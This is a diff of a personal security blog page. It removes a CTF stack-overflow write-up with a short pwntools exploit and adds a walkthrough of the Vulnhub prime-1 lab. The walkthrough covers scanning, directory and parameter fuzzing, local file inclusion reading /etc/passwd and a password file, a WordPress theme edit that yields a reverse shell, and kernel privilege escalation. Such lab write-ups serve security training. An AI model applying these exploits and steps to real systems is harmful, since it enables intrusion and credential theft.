@@ -6,7 +6,7 @@
   <meta http-equiv="cache-control" content="no-cache">
   <meta http-equiv="expires" content="0">
   
-  <title>PWN-StackOverflow | Hustler&#39;s Blog</title>
+  <title>OSCP-Easy-prime_1 | Hustler&#39;s Blog</title>
   <meta name="author" content="Hustler">
   
   <meta name="description" content="Everybody needs love,but hacker dont">
@@ -14,7 +14,7 @@
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
-  <meta property="og:title" content="PWN-StackOverflow"/>
+  <meta property="og:title" content="OSCP-Easy-prime_1"/>
   <meta property="og:site_name" content="Hustler&#39;s Blog"/>
 
   
@@ -112,7 +112,7 @@
 
 	
 		<div class="page-header">
-			<h1> PWN-StackOverflow</h1>
+			<h1> OSCP-Easy-prime_1</h1>
 		</div>
 	
 
@@ -128,15 +128,25 @@
 	<div class="mypage">		
 	  		
 
-	  <p>来源CTFshow</p>
-<h1 id="检查安全设置和类型"><a href="#检查安全设置和类型" class="headerlink" title="检查安全设置和类型"></a>检查安全设置和类型</h1><p>拿到先放到checksec里面检查安全设置和类型：<br><img src="/images/ctfshowpwn02/1.JPG"><br>可以看到没有开启保护，并且是32位小端序</p>
-<h1 id="IDA"><a href="#IDA" class="headerlink" title="IDA"></a>IDA</h1><p>丢进ida，发现get函数，直接检查，发现s这个字符串长度为九个字节，但是函数却允许输入50个字节，直接点击s可以进入下图界面检查：<br><img src="/images/ctfshowpwn02/2.JPG"><br>可以看到，从s的首地址00000000（相对）处开辟了九个字节的空间，即到-00000009，又因为栈是向下生长（向着正生长），而且get允许输入超过九个字节的字符，我们就可以覆盖r处的返回地址<br>查看stack函数的地址为0x804850F，所以有payload和exp如下：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span> <span class="token comment"># 引入pwntools</span>
-p <span class="token operator">=</span> remote<span class="token punctuation">(</span><span class="token string">"pwn.challenge.ctf.show"</span><span class="token punctuation">,</span><span class="token number">28245</span><span class="token punctuation">)</span> <span class="token comment"># 连接远程</span>
-payload<span class="token operator">=</span><span class="token string">b"a"</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x804850F</span><span class="token punctuation">)</span> <span class="token comment"># b'a'*13用于覆盖9+4=13个字节，p32函数则构造了stack的返回地址</span>
-p<span class="token punctuation">.</span>send<span class="token punctuation">(</span>payload<span class="token punctuation">)</span> <span class="token comment"># 发送payload</span>
-p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 交给用户操作（提供交互shell）</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-<p>得到shell后即可查看flag文件</p>
+	  <h1 id="prime-1"><a href="#prime-1" class="headerlink" title="prime-1"></a>prime-1</h1><h2 id="来源：Vulnhub"><a href="#来源：Vulnhub" class="headerlink" title="来源：Vulnhub"></a>来源：Vulnhub</h2><h3 id="难度：Eazy"><a href="#难度：Eazy" class="headerlink" title="难度：Eazy"></a>难度：Eazy</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-O</span> <span class="token parameter variable">-A</span> <span class="token parameter variable">-Pn</span> <span class="token parameter variable">-sV</span> <span class="token parameter variable">-sS</span> -p- <span class="token number">192.168</span>.36.0/24 <span class="token parameter variable">-vv</span> <span class="token parameter variable">-exclude</span> <span class="token number">192.168</span>.36.1
+
+<span class="token comment"># 对除了192.168.36.1之外的目标进行全端口SYN半开扫描，探测系统和服务</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
+<p>发现目标<code>192.168.36.136</code>开启了<code>80,22</code>端口，对应web，ssh服务<br>访问80端口，发现有网页，尝试爆破目录：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.36.136/  <span class="token comment"># 默认部分递归扫描</span>
+dirb http://192.168.36.136/ <span class="token parameter variable">-r</span>  <span class="token comment"># 不递归扫描</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>发现wordpress，dev等路径，访问&#x2F;dev路径提示要更加仔细的挖掘，且下一个敏感文件的文件名为location.txt，尝试指定后缀文件爆破（dirb默认指定爆破的很有限）</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.36.136/ <span class="token parameter variable">-X</span> .php,.txt
+<span class="token comment"># 指定用php和txt后缀字典爆破</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p>爆破出来secret.txt文件，访问提示使用wfuzz对之前爆出来的php文件进行参数爆破：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wfuzz <span class="token parameter variable">-c</span> <span class="token parameter variable">-w</span> /usr/share/wfuzz/wordlist/general/common.txt <span class="token parameter variable">--hc</span> <span class="token number">404</span> http://192.168.36.136/index.php?FUZZ<span class="token operator">=</span>something<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p><img src="/images/OSCPprime1/1.JPG"><br>发现有一行返回数据的长度不一样<code>206ch</code>，是file参数，尝试使用这个参数去读取location.txt文件（?file&#x3D;location.txt），得到新的参数提示，随即去读取&#x2F;etc&#x2F;passwd文件，发现有提示密码在&#x2F;home&#x2F;saket&#x2F;password.txt里面，读取此文件得到密码，尝试使用saket和密码登录ssh无果，猜测是wordpress的用户和密码<br>使用wpscan：</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">wpscan <span class="token parameter variable">--url</span> http://192.168.36.136/wordpress/ <span class="token parameter variable">--enumerate</span> u<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>得到用户victor，使用刚才得到的密码成功登录wordpress，尝试修改主题，找到可以修改的secret.php文件，修改后访问</p>
+<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.36.136/wordpress/wp-content/themes/twentynineteen/secret.php
+
+<span class="token comment"># /wp-content/themes/twentynineteen/secret.php</span>
+<span class="token comment"># 注意记住这个路径</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>得到反弹shell，使用python得到ttyshell，上传linpeas.sh脚本，在内核漏洞最后找到一个highly probable<br><img src="/images/OSCPprime1/2.JPG"><br>这提示我们一定要每个都看一遍 一开始就是以为没有highly probable导致掉入兔子洞<br>使用poc直接提权即可</p>
 
 	  <div class="article-footer-copyright">
 
@@ -154,12 +164,13 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 
     
     
-    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    <a href="/2024/12/20/ctfshowpwn02/" type="button" class="btn btn-default"><i
+                class="fa fa-arrow-circle-o-left"></i> Prev</a>
     
 
     <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
     
-    <a href="/2024/12/19/OSCP-prime1/" type="button" class="btn btn-default ">Next<i
+    <a href="/2024/12/19/OSCP-symfonos2/" type="button" class="btn btn-default ">Next<i
                 class="fa fa-arrow-circle-o-right"></i></a>
     
 
@@ -193,7 +204,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 	
 	<div class="meta-widget">
 	<i class="fa fa-clock-o"></i>
-	2024-12-20 
+	2024-12-19 
 	</div>
 	
 
@@ -204,7 +215,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
     <ul id="categorys" class="tag_box list-unstyled collapse in">
           
   <li>
-    <li><a href="/categories/竞赛/">竞赛<span>22</span></a></li> <li><a href="/categories/竞赛/CTF/">CTF<span>21</span></a></li> <li><a href="/categories/竞赛/CTF/PWN/">PWN<span>5</span></a></li>
+    <li><a href="/categories/靶场练习/">靶场练习<span>4</span></a></li> <li><a href="/categories/靶场练习/OSCP/">OSCP<span>4</span></a></li> <li><a href="/categories/靶场练习/OSCP/Vulnhub/">Vulnhub<span>4</span></a></li> <li><a href="/categories/靶场练习/OSCP/Vulnhub/Easy/">Easy<span>2</span></a></li>
 
 <div class="widget tag">
   <h3 class="title">All Categories</h3>
@@ -223,7 +234,7 @@ p<span class="token punctuation">.</span>interactive<span class="token punctuati
 	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
     <ul id="tags" class="tag_box list-unstyled collapse in">	  
 	    
-  <li><a href="/tags/CTF/">CTF<span>21</span></a></li> <li><a href="/tags/PWN/">PWN<span>5</span></a></li> <li><a href="/tags/CTFshow/">CTFshow<span>1</span></a></li>
+  <li><a href="/tags/OSCP/">OSCP<span>4</span></a></li> <li><a href="/tags/靶场练习/">靶场练习<span>4</span></a></li> <li><a href="/tags/Vulnhub/">Vulnhub<span>4</span></a></li>
     </ul>
 	</div>
 		
